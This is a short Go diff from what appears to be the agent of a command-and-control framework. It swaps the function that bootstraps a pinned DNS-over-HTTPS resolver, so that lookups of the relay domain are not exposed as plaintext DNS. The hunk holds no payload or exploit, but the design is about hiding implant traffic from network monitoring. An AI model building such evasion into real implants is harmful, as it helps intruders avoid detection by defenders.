@@ -137,7 +137,7 @@ func agent_main() {
 		// never leaks a plaintext system-DNS query for the relay domain.
 		// Degrade to the system resolver instead of panicking later on a nil
 		// DefaultResolver.
-		if resolver, dnsErr := c2transport.NewPinnedDoHResolver(
+		if resolver, dnsErr := c2transport.BootstrapPinnedDoH(
 			common.RuntimeConfig.DoHServer,
 		); dnsErr != nil || resolver == nil {
 			logging.Warningf("DoH bootstrap failed (%v), falling back to system DNS", dnsErr)
